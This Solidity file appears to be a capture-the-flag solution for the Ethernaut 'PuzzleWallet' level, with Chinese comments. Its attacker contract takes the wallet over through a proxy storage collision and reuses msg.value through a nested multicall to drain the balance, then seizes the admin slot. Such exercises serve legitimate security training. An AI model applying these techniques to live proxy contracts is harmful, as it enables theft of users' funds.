// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {PuzzleWallet, PuzzleProxy} from "../../src/ethernaut/24_PuzzleWallet/PuzzleWallet.sol";

contract PuzzleWallet_Attacker {
	address player;
	
	PuzzleProxy puzzleProxy;
	PuzzleWallet puzzleWalletAsProxy;
	
	constructor(PuzzleProxy proxy_) payable {
		player = msg.sender;
		
		puzzleProxy = proxy_;
		puzzleWalletAsProxy = PuzzleWallet(address(puzzleProxy));
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 劫持逻辑该合约的 owner
		puzzleProxy.proposeNewAdmin(address(this));
		// 篡改白名单为自己
		puzzleWalletAsProxy.addToWhitelist(address(this));
		
		// 此时，只能算`作劫持了一半`
		// maxBalance 无法直接篡改，即无法直接劫持代理合约的admin
		// 攻击核心：识别双重 msg.value
		
		if (address(puzzleWalletAsProxy).balance > address(this).balance) {
			revert("Attacker Money Is Not Enough!!!");
		}
		
		uint256 amountETH_UsingAttack = address(puzzleWalletAsProxy).balance;
		// 进行双重存入（ETH当然只存了一次，但会计部分存了2次）
		bytes[] memory data = new bytes[](2);
		data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
		bytes[] memory dataMin = new bytes[](1);
		dataMin[0] = data[0];
		data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, dataMin);
		puzzleWalletAsProxy.multicall{value: amountETH_UsingAttack}(data);
		//console.log("puzzleWalletAsProxy.balances(address(this))", puzzleWalletAsProxy.balances(address(this)));
		// 全部取出，即将掏空
		puzzleWalletAsProxy.execute(address(this), amountETH_UsingAttack * 2, "");
		//console.log("puzzleWalletAsProxy.balances(address(this))", puzzleWalletAsProxy.balances(address(this)));
		// 至此，终于可以进行修改余额
		puzzleWalletAsProxy.setMaxBalance(uint256(uint160(player)));
	}
}
